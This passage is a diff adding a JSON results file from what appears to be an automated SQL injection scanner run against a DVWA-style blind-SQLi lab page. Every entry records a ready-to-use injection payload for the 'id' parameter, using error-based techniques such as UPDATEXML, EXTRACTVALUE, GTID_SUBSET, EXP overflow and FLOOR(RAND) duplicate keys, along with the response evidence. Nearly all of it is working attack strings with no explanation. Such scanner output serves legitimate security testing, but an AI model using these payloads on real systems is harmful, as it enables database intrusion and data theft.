+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 AND GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0171,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,FLOOR(RAND(0)*2))x FROM (SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5)a GROUP BY x) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.015,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 AND UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0201,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 'v' + 'u' + 'n' WHERE 1=1 OR NOT 1=1 )||'",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0228,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 OR ROW(1,1)>(SELECT COUNT(*),CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,FLOOR(RAND(0)*2))x FROM (SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5)a GROUP BY x) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0237,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 OR UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0255,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,'x'))s), 8446744073709551610, 8446744073709551610))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0222,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 OR EXTRACTVALUE(1,CONCAT('\\',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0203,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,'x'))x)) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0147,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 OR ERROR(CONCAT(0x5356534441414141,(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END)),0x5641534441414141)) IS NOT NULL )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0184,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    }
+  ]
+}
